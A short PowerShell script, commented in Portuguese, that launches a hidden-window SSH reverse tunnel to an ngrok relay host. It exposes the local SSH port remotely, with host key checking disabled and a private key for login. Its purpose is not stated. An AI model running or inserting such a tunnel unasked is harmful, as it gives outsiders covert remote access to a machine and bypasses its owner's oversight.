# Caminho do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Users\Teste\.ssh\ssh_key"

# Arquivos de log separados
$stdoutLog = "C:\Users\Teste\.ssh\ssh_stdout.log"
$stderrLog = "C:\Users\Teste\.ssh\ssh_stderr.log"

# Argumentos do SSH
$sshArgs = @(
    "-i", "$keyPath",
    "-o", "StrictHostKeyChecking=no",
    "-o", "ServerAliveInterval=60",
    "-o", "ServerAliveCountMax=3",
    "-o", "ExitOnForwardFailure=yes",
    "-R", "2222:localhost:22",
    "logosofico@0.tcp.sa.ngrok.io",
    "-p", "17096",
    "-N"
)

# Executa SSH em segundo plano com logs separados
Start-Process -FilePath $sshPath `
              -ArgumentList $sshArgs `
              -RedirectStandardOutput $stdoutLog `
              -RedirectStandardError $stderrLog `
              -WindowStyle Hidden
